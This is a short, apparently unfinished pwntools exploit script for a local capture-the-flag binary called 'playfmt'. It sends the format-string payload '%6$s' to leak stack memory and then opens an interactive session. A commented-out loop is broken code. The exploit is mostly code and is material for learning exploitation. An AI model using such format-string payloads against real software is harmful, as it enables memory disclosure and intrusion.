from pwn import *

context.arch = "i386"
context.log_level = "DEBUG"

p = process("./playfmt")
e = ELF("./playfmt")

libc = ELF("../libc.so.6")

buf_addr = 0x0804A060


p.recvuntil("Server\n")
p.recvuntil("===\n")

payload = ""
payload += "%6$s"

p.sendline(payload)

'''
plen = len(payload)
max_len = plen / 4 + (0 if plen % 4 == 0 else 1)

for line in plen:
'''

p.interactive()